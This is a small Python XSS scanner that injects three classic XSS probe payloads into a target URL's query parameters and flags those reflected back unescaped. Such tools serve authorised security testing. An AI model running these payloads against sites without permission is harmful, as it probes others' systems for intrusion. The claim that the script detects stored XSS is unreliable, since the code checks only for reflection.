#!/usr/bin/env python3
"""
xss_finder.py — Detect reflected/stored XSS vulnerabilities.
Usage:
  python3 xss_finder.py --url "https://example.com/search?q=test"
"""

import requests, argparse, re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style

PAYLOADS = [
    "<script>alert('XSS')</script>",
    "'><img src=x onerror=alert(1)>",
    "\" onmouseover=alert('XSS')>"
]

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))
    return new_url

def scan_xss(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        print(Fore.RED + "[!] No parameters to test in this URL." + Style.RESET_ALL)
        return

    print(Fore.CYAN + f"[+] Testing {len(params)} parameters for XSS..." + Style.RESET_ALL)

    for param in params:
        for payload in PAYLOADS:
            test_url = inject_payload(url, param, payload)
            try:
                r = requests.get(test_url, timeout=5)
                if payload in r.text:
                    print(Fore.GREEN + f"[VULNERABLE] {param} reflected with payload: {payload}" + Style.RESET_ALL)
                else:
                    print(Fore.YELLOW + f"[SAFE] {param} sanitized payload: {payload}" + Style.RESET_ALL)
            except requests.RequestException:
                print(Fore.RED + f"[!] Error testing {test_url}" + Style.RESET_ALL)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True, help="Target URL with parameters")
    args = parser.parse_args()
    scan_xss(args.url)

if __name__ == "__main__":
    main()
